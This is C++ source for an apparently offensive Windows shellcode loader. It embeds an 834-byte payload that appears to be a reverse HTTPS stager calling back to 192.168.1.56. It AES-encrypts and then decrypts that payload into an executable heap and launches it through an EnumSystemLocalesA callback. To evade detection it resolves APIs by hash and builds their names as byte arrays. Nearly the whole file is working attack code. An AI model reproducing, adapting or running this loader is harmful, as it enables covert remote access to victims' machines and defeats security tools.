// ReSharper disable CppClangTidyClangDiagnosticMicrosoftGoto
// ReSharper disable CppClangTidyHicppAvoidGoto
// ReSharper disable CppClangTidyCppcoreguidelinesAvoidGoto
#include <windows.h>
#include <bcrypt.h>
#include <functional>

#include "GetProcAddressWithHash.hpp"

#pragma comment(lib, "Bcrypt.lib")

static const BYTE rgbRawPayload[834] = {
    0xFC, 0xE8, 0x89, 0x00, 0x00, 0x00, 0x60, 0x89, 0xE5, 0x31, 0xD2, 0x64,
    0x8B, 0x52, 0x30, 0x8B, 0x52, 0x0C, 0x8B, 0x52, 0x14, 0x8B, 0x72, 0x28,
    0x0F, 0xB7, 0x4A, 0x26, 0x31, 0xFF, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C,
    0x02, 0x2C, 0x20, 0xC1, 0xCF, 0x0D, 0x01, 0xC7, 0xE2, 0xF0, 0x52, 0x57,
    0x8B, 0x52, 0x10, 0x8B, 0x42, 0x3C, 0x01, 0xD0, 0x8B, 0x40, 0x78, 0x85,
    0xC0, 0x74, 0x4A, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x8B, 0x58, 0x20,
    0x01, 0xD3, 0xE3, 0x3C, 0x49, 0x8B, 0x34, 0x8B, 0x01, 0xD6, 0x31, 0xFF,
    0x31, 0xC0, 0xAC, 0xC1, 0xCF, 0x0D, 0x01, 0xC7, 0x38, 0xE0, 0x75, 0xF4,
    0x03, 0x7D, 0xF8, 0x3B, 0x7D, 0x24, 0x75, 0xE2, 0x58, 0x8B, 0x58, 0x24,
    0x01, 0xD3, 0x66, 0x8B, 0x0C, 0x4B, 0x8B, 0x58, 0x1C, 0x01, 0xD3, 0x8B,
    0x04, 0x8B, 0x01, 0xD0, 0x89, 0x44, 0x24, 0x24, 0x5B, 0x5B, 0x61, 0x59,
    0x5A, 0x51, 0xFF, 0xE0, 0x58, 0x5F, 0x5A, 0x8B, 0x12, 0xEB, 0x86, 0x5D,
    0x68, 0x6E, 0x65, 0x74, 0x00, 0x68, 0x77, 0x69, 0x6E, 0x69, 0x54, 0x68,
    0x4C, 0x77, 0x26, 0x07, 0xFF, 0xD5, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x31,
    0xFF, 0x57, 0x57, 0x57, 0x57, 0x57, 0x68, 0x3A, 0x56, 0x79, 0xA7, 0xFF,
    0xD5, 0xE9, 0xA4, 0x00, 0x00, 0x00, 0x5B, 0x31, 0xC9, 0x51, 0x51, 0x6A,
    0x03, 0x51, 0x51, 0x68, 0xBB, 0x01, 0x00, 0x00, 0x53, 0x50, 0x68, 0x57,
    0x89, 0x9F, 0xC6, 0xFF, 0xD5, 0x50, 0xE9, 0x8C, 0x00, 0x00, 0x00, 0x5B,
    0x31, 0xD2, 0x52, 0x68, 0x00, 0x32, 0xC0, 0x84, 0x52, 0x52, 0x52, 0x53,
    0x52, 0x50, 0x68, 0xEB, 0x55, 0x2E, 0x3B, 0xFF, 0xD5, 0x89, 0xC6, 0x83,
    0xC3, 0x50, 0x68, 0x80, 0x33, 0x00, 0x00, 0x89, 0xE0, 0x6A, 0x04, 0x50,
    0x6A, 0x1F, 0x56, 0x68, 0x75, 0x46, 0x9E, 0x86, 0xFF, 0xD5, 0x5F, 0x31,
    0xFF, 0x57, 0x57, 0x6A, 0xFF, 0x53, 0x56, 0x68, 0x2D, 0x06, 0x18, 0x7B,
    0xFF, 0xD5, 0x85, 0xC0, 0x0F, 0x84, 0xCA, 0x01, 0x00, 0x00, 0x31, 0xFF,
    0x85, 0xF6, 0x74, 0x04, 0x89, 0xF9, 0xEB, 0x09, 0x68, 0xAA, 0xC5, 0xE2,
    0x5D, 0xFF, 0xD5, 0x89, 0xC1, 0x68, 0x45, 0x21, 0x5E, 0x31, 0xFF, 0xD5,
    0x31, 0xFF, 0x57, 0x6A, 0x07, 0x51, 0x56, 0x50, 0x68, 0xB7, 0x57, 0xE0,
    0x0B, 0xFF, 0xD5, 0xBF, 0x00, 0x2F, 0x00, 0x00, 0x39, 0xC7, 0x75, 0x07,
    0x58, 0x50, 0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0x31, 0xFF, 0xE9, 0x91, 0x01,
    0x00, 0x00, 0xE9, 0xC9, 0x01, 0x00, 0x00, 0xE8, 0x6F, 0xFF, 0xFF, 0xFF,
    0x2F, 0x63, 0x35, 0x50, 0x74, 0x00, 0xB3, 0x22, 0x33, 0xB1, 0xFB, 0xED,
    0x84, 0x21, 0xB1, 0xD5, 0x4B, 0xE9, 0xE0, 0x17, 0xE9, 0xEB, 0x18, 0x22,
    0xF9, 0xFD, 0x79, 0xFD, 0xBF, 0xB1, 0xE1, 0x01, 0xF5, 0x5C, 0x0C, 0x41,
    0xAD, 0x08, 0x60, 0xA5, 0xB8, 0x0F, 0x9A, 0x40, 0xCF, 0x28, 0xC0, 0xC2,
    0x27, 0x3E, 0x8C, 0x85, 0xF1, 0x85, 0x6C, 0xE2, 0x44, 0x34, 0xF2, 0x3E,
    0x83, 0x71, 0xBD, 0xE0, 0x10, 0x11, 0x9E, 0x42, 0x56, 0xFB, 0x0F, 0x4A,
    0x2A, 0xCE, 0x25, 0x54, 0x40, 0xF0, 0x3F, 0x00, 0x55, 0x73, 0x65, 0x72,
    0x2D, 0x41, 0x67, 0x65, 0x6E, 0x74, 0x3A, 0x20, 0x4D, 0x6F, 0x7A, 0x69,
    0x6C, 0x6C, 0x61, 0x2F, 0x35, 0x2E, 0x30, 0x20, 0x28, 0x63, 0x6F, 0x6D,
    0x70, 0x61, 0x74, 0x69, 0x62, 0x6C, 0x65, 0x3B, 0x20, 0x4D, 0x53, 0x49,
    0x45, 0x20, 0x39, 0x2E, 0x30, 0x3B, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F,
    0x77, 0x73, 0x20, 0x4E, 0x54, 0x20, 0x36, 0x2E, 0x31, 0x3B, 0x20, 0x57,
    0x4F, 0x57, 0x36, 0x34, 0x3B, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6E,
    0x74, 0x2F, 0x35, 0x2E, 0x30, 0x3B, 0x20, 0x4E, 0x50, 0x30, 0x39, 0x3B,
    0x20, 0x4E, 0x50, 0x30, 0x39, 0x3B, 0x20, 0x4D, 0x41, 0x41, 0x55, 0x29,
    0x0D, 0x0A, 0x00, 0xA1, 0xB6, 0x94, 0x9F, 0x51, 0x07, 0x61, 0xF7, 0x67,
    0x2D, 0xC0, 0x49, 0xF7, 0xB3, 0x21, 0x26, 0x69, 0x33, 0x15, 0x01, 0xAB,
    0xD3, 0x92, 0xA1, 0x04, 0x8C, 0x9D, 0xEE, 0xC5, 0x46, 0x37, 0x1E, 0xC1,
    0xB1, 0x71, 0xCE, 0xA7, 0xA3, 0xF0, 0x09, 0x2C, 0x57, 0x91, 0x53, 0x04,
    0x87, 0xA2, 0x19, 0x67, 0x65, 0x46, 0x02, 0x77, 0x65, 0x87, 0xF5, 0xC6,
    0x5E, 0xEB, 0x24, 0xF2, 0xE5, 0xB2, 0x0C, 0xAE, 0xE6, 0x6C, 0x7B, 0xC4,
    0x80, 0x02, 0xA4, 0x72, 0x77, 0x45, 0xF3, 0x98, 0x8E, 0xB6, 0xC0, 0xAD,
    0x8E, 0x33, 0xF4, 0x04, 0x48, 0xBE, 0x04, 0x1F, 0x10, 0xBE, 0x28, 0x04,
    0x38, 0xF4, 0x92, 0x88, 0x52, 0x68, 0xE8, 0x4F, 0x5D, 0xEF, 0x71, 0xC4,
    0x46, 0xC3, 0x5E, 0xA4, 0x6F, 0x15, 0xD8, 0xD7, 0xF3, 0xD2, 0x83, 0xF8,
    0xDA, 0x4E, 0xC7, 0xAD, 0xF8, 0xC6, 0x77, 0x6C, 0xCA, 0x61, 0x63, 0xE9,
    0x95, 0x55, 0x5A, 0x30, 0x59, 0x72, 0x49, 0xC1, 0x58, 0xFD, 0x8F, 0x3F,
    0xA8, 0xAB, 0x0D, 0xAE, 0xBD, 0x89, 0x38, 0xB8, 0xFB, 0x18, 0xEA, 0x8E,
    0xBC, 0xB8, 0x3D, 0x90, 0x31, 0x05, 0x1E, 0x42, 0x1F, 0x49, 0xF0, 0xCB,
    0xB7, 0x32, 0xDF, 0xB9, 0xF2, 0x29, 0x1D, 0x1C, 0x72, 0xE7, 0x45, 0x20,
    0xFD, 0x47, 0x52, 0xDE, 0xDC, 0xB9, 0x19, 0xC2, 0x91, 0x75, 0x5A, 0x2D,
    0x83, 0x1C, 0x14, 0x3F, 0x29, 0x65, 0x74, 0x23, 0x4A, 0xEB, 0xDC, 0x00,
    0x68, 0xF0, 0xB5, 0xA2, 0x56, 0xFF, 0xD5, 0x6A, 0x40, 0x68, 0x00, 0x10,
    0x00, 0x00, 0x68, 0x00, 0x00, 0x40, 0x00, 0x57, 0x68, 0x58, 0xA4, 0x53,
    0xE5, 0xFF, 0xD5, 0x93, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x01, 0xD9, 0x51,
    0x53, 0x89, 0xE7, 0x57, 0x68, 0x00, 0x20, 0x00, 0x00, 0x53, 0x56, 0x68,
    0x12, 0x96, 0x89, 0xE2, 0xFF, 0xD5, 0x85, 0xC0, 0x74, 0xC6, 0x8B, 0x07,
    0x01, 0xC3, 0x85, 0xC0, 0x75, 0xE5, 0x58, 0xC3, 0xE8, 0x89, 0xFD, 0xFF,
    0xFF, 0x31, 0x39, 0x32, 0x2E, 0x31, 0x36, 0x38, 0x2E, 0x31, 0x2E, 0x35,
    0x36, 0x00, 0x12, 0x34, 0x56, 0x78
};


#define NT_SUCCESS(Status)          (((NTSTATUS)(Status)) >= 0)
#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001L)

/* =================================================== DLL =================================================== */
#define LDRLOADDLL_HASH					0xbdbf9c13
#define LDRGETPROCADDRESS_HASH			0x5ed941b5

typedef NTSTATUS(WINAPI* LDRLOADDLL)(PWCHAR, ULONG, PUNICODE_STRING, PHANDLE);
typedef NTSTATUS(WINAPI* LDRGETPROCADDRESS)(HMODULE, PANSI_STRING, WORD, PVOID*);
                
typedef NTSTATUS(WINAPI* BCRYPTOPENALGORITHMPROVIDER)(BCRYPT_ALG_HANDLE*, LPCWSTR, LPCWSTR, ULONG);
typedef NTSTATUS(WINAPI* BCRYPTGETPROPERTY)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG*, ULONG);
typedef NTSTATUS(WINAPI* BCRYPTSETPROPERTY)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);
typedef NTSTATUS(WINAPI* BCRYPTGENERATESYMMETRICKEY)(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
typedef NTSTATUS(WINAPI* BCRYPTDECRYPT)(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
typedef NTSTATUS(WINAPI* BCRYPTCLOSEALGORITHMPROVIDER)(BCRYPT_ALG_HANDLE, ULONG);
typedef NTSTATUS(WINAPI* BCRYPTDESTROYKEY)(BCRYPT_KEY_HANDLE);

typedef LPVOID(WINAPI* HEAPALLOC)(HANDLE, DWORD, SIZE_T);
typedef HANDLE(WINAPI* GETPROCESSHEAP)();
typedef HANDLE(WINAPI* HEAPCREATE)(DWORD, SIZE_T, SIZE_T);
typedef BOOL(WINAPI* ENUMSYSTEMLOCALESA)(LOCALE_ENUMPROCA, DWORD);
typedef BOOL(WINAPI* HEAPFREE)(HANDLE, DWORD, LPVOID);

#define FILL_STRING_WITH_BUF(string, buffer) \
	string.Length = sizeof(buffer); \
	string.MaximumLength = string.Length; \
	string.Buffer = (PCHAR)buffer


void Run(PBYTE pbCipherText, DWORD cbCipherText)
{
	// Variables
    BCRYPT_ALG_HANDLE       hAesAlg = nullptr;
    BCRYPT_KEY_HANDLE       hKey = nullptr;
    NTSTATUS                status = STATUS_UNSUCCESSFUL;
    DWORD                   cbRawData = 0,
					        cbData = 0,
					        cbKeyObject = 0,
					        cbBlockLen = 0;
    PBYTE                   pbRawData = nullptr,
					        pbKeyObject = nullptr,
					        pbIV = nullptr;
    BYTE                    rgbIV[16] = {};
    BYTE                    rgbAES128Key[16] = {};
    HANDLE                  cryptLib,
							library;
	
	// Function pointers
    LDRLOADDLL                      pLdrLoadDll = nullptr;
    LDRGETPROCADDRESS               pLdrGetProcAddress = nullptr;
	
    BCRYPTOPENALGORITHMPROVIDER     pBCryptOpenAlgorithmProvider = nullptr;
    BCRYPTGETPROPERTY               pBCryptGetProperty = nullptr;
    BCRYPTSETPROPERTY               pBCryptSetProperty = nullptr;
    BCRYPTGENERATESYMMETRICKEY      pBCryptGenerateSymmetricKey = nullptr;
    BCRYPTDECRYPT                   pBCryptDecrypt = nullptr;
    BCRYPTCLOSEALGORITHMPROVIDER    pBCryptCloseAlgorithmProvider = nullptr;
    BCRYPTDESTROYKEY                pBCryptDestroyKey = nullptr;

    HEAPALLOC                       pHeapAlloc = nullptr;
    GETPROCESSHEAP                  pGetProcessHeap = nullptr;
    HEAPCREATE                      pHeapCreate = nullptr;
    ENUMSYSTEMLOCALESA              pEnumSystemLocalesA = nullptr;
    HEAPFREE                        pHeapFree = nullptr;

	// Retard strings
    UNICODE_STRING  uString = { 0 };
    STRING          aString = { 0 };

    WCHAR sBcrypt[] = { 'B', 'c', 'r', 'y', 'p', 't', '.', 'd', 'l', 'l' };
    WCHAR sKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l' };

    BYTE sBCryptOpenAlgorithmProvider[] = { 'B', 'C', 'r', 'y', 'p', 't', 'O', 'p', 'e', 'n', 'A', 'l', 'g', 'o', 'r', 'i', 't', 'h', 'm', 'P', 'r', 'o', 'v', 'i', 'd', 'e', 'r' };
    BYTE sBCryptGetProperty[] = { 'B', 'C', 'r', 'y', 'p', 't', 'G', 'e', 't', 'P', 'r', 'o', 'p', 'e', 'r', 't', 'y' };
    BYTE sBCryptSetProperty[] = { 'B', 'C', 'r', 'y', 'p', 't', 'S', 'e', 't', 'P', 'r', 'o', 'p', 'e', 'r', 't', 'y' };
    BYTE sBCryptGenerateSymmetricKey[] = { 'B', 'C', 'r', 'y', 'p', 't', 'G', 'e', 'n', 'e', 'r', 'a', 't', 'e', 'S', 'y', 'm', 'm', 'e', 't', 'r', 'i', 'c', 'K', 'e', 'y' };
    BYTE sBCryptDecrypt[] = { 'B', 'C', 'r', 'y', 'p', 't', 'D', 'e', 'c', 'r', 'y', 'p', 't' };
    BYTE sBCryptCloseAlgorithmProvider[] = { 'B', 'C', 'r', 'y', 'p', 't', 'C', 'l', 'o', 's', 'e', 'A', 'l', 'g', 'o', 'r', 'i', 't', 'h', 'm', 'P', 'r', 'o', 'v', 'i', 'd', 'e', 'r' };
    BYTE sBCryptDestroyKey[] = { 'B', 'C', 'r', 'y', 'p', 't', 'D', 'e', 's', 't', 'r', 'o', 'y', 'K', 'e', 'y' };

    BYTE sHeapAlloc[] = { 'H', 'e', 'a', 'p', 'A', 'l', 'l', 'o', 'c' };
    BYTE sGetProcessHeap[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 'H', 'e', 'a', 'p' };
    BYTE SHeapCreate[] = { 'H', 'e', 'a', 'p', 'C', 'r', 'e', 'a', 't', 'e' };
    BYTE sEnumSystemLocalesA[] = { 'E', 'n', 'u', 'm', 'S', 'y', 's', 't', 'e', 'm', 'L', 'o', 'c', 'a', 'l', 'e', 's', 'A' };
    BYTE sHeapFree[] = { 'H', 'e', 'a', 'p', 'F', 'r', 'e', 'e' };

    // -------

	///
	// STEP 1: locate all the required functions
	///
	
    pLdrLoadDll = (LDRLOADDLL)GetProcAddressWithHash(LDRLOADDLL_HASH);
    pLdrGetProcAddress = (LDRGETPROCADDRESS)GetProcAddressWithHash(LDRGETPROCADDRESS_HASH);

    uString.Buffer = sBcrypt;
    uString.MaximumLength = sizeof(sBcrypt);
    uString.Length = sizeof(sBcrypt);
    pLdrLoadDll(nullptr, 0, &uString, &cryptLib);

    FILL_STRING_WITH_BUF(aString, sBCryptOpenAlgorithmProvider);
    pLdrGetProcAddress((HMODULE)cryptLib, &aString, 0, (PVOID*)&pBCryptOpenAlgorithmProvider);

    FILL_STRING_WITH_BUF(aString, sBCryptGetProperty);
    pLdrGetProcAddress((HMODULE)cryptLib, &aString, 0, (PVOID*)&pBCryptGetProperty);

    FILL_STRING_WITH_BUF(aString, sBCryptSetProperty);
    pLdrGetProcAddress((HMODULE)cryptLib, &aString, 0, (PVOID*)&pBCryptSetProperty);

    FILL_STRING_WITH_BUF(aString, sBCryptGenerateSymmetricKey);
    pLdrGetProcAddress((HMODULE)cryptLib, &aString, 0, (PVOID*)&pBCryptGenerateSymmetricKey);

    FILL_STRING_WITH_BUF(aString, sBCryptDecrypt);
    pLdrGetProcAddress((HMODULE)cryptLib, &aString, 0, (PVOID*)&pBCryptDecrypt);

    FILL_STRING_WITH_BUF(aString, sBCryptCloseAlgorithmProvider);
    pLdrGetProcAddress((HMODULE)cryptLib, &aString, 0, (PVOID*)&pBCryptCloseAlgorithmProvider);

    FILL_STRING_WITH_BUF(aString, sBCryptDestroyKey);
    pLdrGetProcAddress((HMODULE)cryptLib, &aString, 0, (PVOID*)&pBCryptDestroyKey);

    if (!pBCryptOpenAlgorithmProvider || !pBCryptGetProperty || !pBCryptSetProperty || !pBCryptGenerateSymmetricKey ||
        !pBCryptDecrypt || !pBCryptCloseAlgorithmProvider || !pBCryptDestroyKey) 
    {
        goto Cleanup;
    }

    uString.Buffer = sKernel32;
    uString.MaximumLength = sizeof(sKernel32);
    uString.Length = sizeof(sKernel32);

    pLdrLoadDll(nullptr, 0, &uString, &library);

    FILL_STRING_WITH_BUF(aString, sHeapAlloc);
    pLdrGetProcAddress((HMODULE)library, &aString, 0, (PVOID*)&pHeapAlloc);

	FILL_STRING_WITH_BUF(aString, sGetProcessHeap);
    pLdrGetProcAddress((HMODULE)library, &aString, 0, (PVOID*)&pGetProcessHeap);

    FILL_STRING_WITH_BUF(aString, SHeapCreate);
    pLdrGetProcAddress((HMODULE)library, &aString, 0, (PVOID*)&pHeapCreate);

    FILL_STRING_WITH_BUF(aString, sEnumSystemLocalesA);
    pLdrGetProcAddress((HMODULE)library, &aString, 0, (PVOID*)&pEnumSystemLocalesA);

	FILL_STRING_WITH_BUF(aString, sHeapFree);
    pLdrGetProcAddress((HMODULE)library, &aString, 0, (PVOID*)&pHeapFree);

	if (!pHeapAlloc || !pGetProcessHeap || !pHeapCreate || !pEnumSystemLocalesA || !pHeapFree)
	{
        goto Cleanup;
	}

    ///
	// STEP 2: Decrypt
	///
	
    memcpy(rgbAES128Key, &pbCipherText[cbCipherText - 32], 16);
    memcpy(rgbIV, &pbCipherText[cbCipherText - 16], 16);

    // Open an algorithm handle.
    if (!NT_SUCCESS(status = pBCryptOpenAlgorithmProvider(
        &hAesAlg,
        BCRYPT_AES_ALGORITHM,
        NULL,
        0)))
    {
        goto Cleanup;
    }

    // Calculate the size of the buffer to hold the KeyObject.
    if (!NT_SUCCESS(status = pBCryptGetProperty(
        hAesAlg,
        BCRYPT_OBJECT_LENGTH,
        (PBYTE)&cbKeyObject,
        sizeof(DWORD),
        &cbData,
        0)))
    {;
        goto Cleanup;
    }

    // Allocate the key object on the heap.;
    pbKeyObject = (PBYTE)pHeapAlloc(pGetProcessHeap(), 0, cbKeyObject);
	if (nullptr == pbKeyObject)
    {
        goto Cleanup;
    }

    // Calculate the block length for the IV.
    if (!NT_SUCCESS(status = pBCryptGetProperty(
        hAesAlg,
        BCRYPT_BLOCK_LENGTH,
        (PBYTE)&cbBlockLen,
        sizeof(DWORD),
        &cbData,
        0)))
    {;
        goto Cleanup;
    }

    // Determine whether the cbBlockLen is not longer than the IV length.
    if (cbBlockLen > sizeof(rgbIV))
    {;
        goto Cleanup;
    }

    // Allocate a buffer for the IV. The buffer is consumed during the 
    // encrypt/decrypt process.
    pbIV = (PBYTE)pHeapAlloc(pGetProcessHeap(), 0, cbBlockLen);
    if (nullptr == pbIV)
    {
        goto Cleanup;
    }

    memcpy(pbIV, rgbIV, cbBlockLen);

    if (!NT_SUCCESS(status = pBCryptSetProperty(
        hAesAlg,
        BCRYPT_CHAINING_MODE,
        (PBYTE)BCRYPT_CHAIN_MODE_CBC,
        sizeof(BCRYPT_CHAIN_MODE_CBC),
        0)))
    {
        goto Cleanup;
    }

    // Generate the key from supplied input key bytes.
    if (!NT_SUCCESS(status = pBCryptGenerateSymmetricKey(
        hAesAlg,
        &hKey,
        pbKeyObject,
        cbKeyObject,
        (PBYTE)rgbAES128Key,
        sizeof(rgbAES128Key),
        0)))
    {
        goto Cleanup;
    }

    ////
	//// Get the output buffer size.
	////
	if (!NT_SUCCESS(status = pBCryptDecrypt(
	    hKey,
	    pbCipherText,
	    cbCipherText - 32,
	    NULL,
	    pbIV,
	    cbBlockLen,
	    NULL,
	    0,
	    &cbRawData,
	    BCRYPT_BLOCK_PADDING)))
	{
	    goto Cleanup;
	}
	
	pbRawData = (PBYTE)pHeapAlloc(
        pHeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0), 
        0, cbRawData);
	if (nullptr == pbRawData)
	{
	    goto Cleanup;
	}

	if (!NT_SUCCESS(status = pBCryptDecrypt(
	    hKey,
	    pbCipherText,
	    cbCipherText - 32,
	    NULL,
	    pbIV,
	    cbBlockLen,
	    pbRawData,
	    cbRawData,
	    &cbRawData,
	    BCRYPT_BLOCK_PADDING)))
	{
	    goto Cleanup;
	}

    ///
	// STEP 3: Run shell code
	///
	
    pEnumSystemLocalesA((LOCALE_ENUMPROCA)pbRawData, 0);

Cleanup:

    if (hAesAlg)
    {
        pBCryptCloseAlgorithmProvider(hAesAlg, 0);
    }

    if (hKey)
    {
        pBCryptDestroyKey(hKey);
    }

    if (pbCipherText)
    {
        pHeapFree(pGetProcessHeap(), 0, pbCipherText);
    }

    if (pbRawData)
    {
        pHeapFree(pGetProcessHeap(), 0, pbRawData);
    }

    if (pbKeyObject)
    {
        pHeapFree(pGetProcessHeap(), 0, pbKeyObject);
    }

    if (pbIV)
    {
        pHeapFree(pGetProcessHeap(), 0, pbIV);
    }
}

/* =================================================== Loader ================================================ */
static const BYTE rgbIV[] =
{
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F
};

static const BYTE rgbAES128Key[] =
{
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F
};

void main()
{
	BCRYPT_ALG_HANDLE       hAesAlg = nullptr;
	BCRYPT_KEY_HANDLE       hKey = nullptr;
	NTSTATUS                status = STATUS_UNSUCCESSFUL;
	DWORD                   cbCipherText = 0,
							cbRawData = 0,
							cbData = 0,
							cbKeyObject = 0,
							cbBlockLen = 0;
	PBYTE                   pbCipherText = nullptr,
							pbRawData = nullptr,
							pbKeyObject = nullptr,
							pbIV = nullptr;
    BYTE                    creds[32] = {};

    // Open an algorithm handle.
    if (!NT_SUCCESS(status = BCryptOpenAlgorithmProvider(
        &hAesAlg,
        BCRYPT_AES_ALGORITHM,
        NULL,
        0)))
    {
        wprintf(L"**** Error 0x%x returned by BCryptOpenAlgorithmProvider\n", status);
        goto Cleanup;
    }

    // Calculate the size of the buffer to hold the KeyObject.
    if (!NT_SUCCESS(status = BCryptGetProperty(
        hAesAlg,
        BCRYPT_OBJECT_LENGTH,
        (PBYTE)&cbKeyObject,
        sizeof(DWORD),
        &cbData,
        0)))
    {
        wprintf(L"**** Error 0x%x returned by BCryptGetProperty\n", status);
        goto Cleanup;
    }

    // Allocate the key object on the heap.
    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (nullptr == pbKeyObject)
    {
        wprintf(L"**** memory allocation failed\n");
        goto Cleanup;
    }

    // Calculate the block length for the IV.
    if (!NT_SUCCESS(status = BCryptGetProperty(
        hAesAlg,
        BCRYPT_BLOCK_LENGTH,
        (PBYTE)&cbBlockLen,
        sizeof(DWORD),
        &cbData,
        0)))
    {
        wprintf(L"**** Error 0x%x returned by BCryptGetProperty\n", status);
        goto Cleanup;
    }

    // Determine whether the cbBlockLen is not longer than the IV length.
    if (cbBlockLen > sizeof(rgbIV))
    {
        wprintf(L"**** block length is longer than the provided IV length\n");
        goto Cleanup;
    }

    // Allocate a buffer for the IV. The buffer is consumed during the 
    // encrypt/decrypt process.
    pbIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbBlockLen);
    if (nullptr == pbIV)
    {
        wprintf(L"**** memory allocation failed\n");
        goto Cleanup;
    }

    memcpy(pbIV, rgbIV, cbBlockLen);

    if (!NT_SUCCESS(status = BCryptSetProperty(
        hAesAlg,
        BCRYPT_CHAINING_MODE,
        (PBYTE)BCRYPT_CHAIN_MODE_CBC,
        sizeof(BCRYPT_CHAIN_MODE_CBC),
        0)))
    {
        wprintf(L"**** Error 0x%x returned by BCryptSetProperty\n", status);
        goto Cleanup;
    }

    // Generate the key from supplied input key bytes.
    if (!NT_SUCCESS(status = BCryptGenerateSymmetricKey(
        hAesAlg,
        &hKey,
        pbKeyObject,
        cbKeyObject,
        (PBYTE)rgbAES128Key,
        sizeof(rgbAES128Key),
        0)))
    {
        wprintf(L"**** Error 0x%x returned by BCryptGenerateSymmetricKey\n", status);
        goto Cleanup;
    }

    cbRawData = sizeof(rgbRawPayload);
    pbRawData = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbRawData);
    if (nullptr == pbRawData)
    {
        wprintf(L"**** memory allocation failed\n");
        goto Cleanup;
    }

    memcpy(pbRawData, rgbRawPayload, sizeof(rgbRawPayload));

    //
    // Get the output buffer size.
    //
    if (!NT_SUCCESS(status = BCryptEncrypt(
        hKey,
        pbRawData,
        cbRawData,
        NULL,
        pbIV,
        cbBlockLen,
        NULL,
        0,
        &cbCipherText,
        BCRYPT_BLOCK_PADDING)))
    {
        wprintf(L"**** Error 0x%x returned by BCryptEncrypt\n", status);
        goto Cleanup;
    }

    pbCipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbCipherText + 32);
    if (nullptr == pbCipherText)
    {
        wprintf(L"**** memory allocation failed\n");
        goto Cleanup;
    }

    // Use the key to encrypt the plaintext buffer.
    // For block sized messages, block padding will add an extra block.
    if (!NT_SUCCESS(status = BCryptEncrypt(
        hKey,
        pbRawData,
        cbRawData,
        NULL,
        pbIV,
        cbBlockLen,
        pbCipherText,
        cbCipherText,
        &cbData,
        BCRYPT_BLOCK_PADDING)))
    {
        wprintf(L"**** Error 0x%x returned by BCryptEncrypt\n", status);
        goto Cleanup;
    }

    std::copy_n(rgbAES128Key, 16, creds);
    std::copy_n(rgbIV, 16, creds + 16);

    memcpy(&pbCipherText[cbCipherText], creds, sizeof(creds));
	
	Run(pbCipherText, cbCipherText + 32);

Cleanup:

    if (hAesAlg)
    {
        BCryptCloseAlgorithmProvider(hAesAlg, 0);
    }

    if (hKey)
    {
        BCryptDestroyKey(hKey);
    }

    if (pbCipherText)
    {
        HeapFree(GetProcessHeap(), 0, pbCipherText);
    }

    if (pbRawData)
    {
        HeapFree(GetProcessHeap(), 0, pbRawData);
    }

    if (pbKeyObject)
    {
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
    }

    if (pbIV)
    {
        HeapFree(GetProcessHeap(), 0, pbIV);
    }
	
}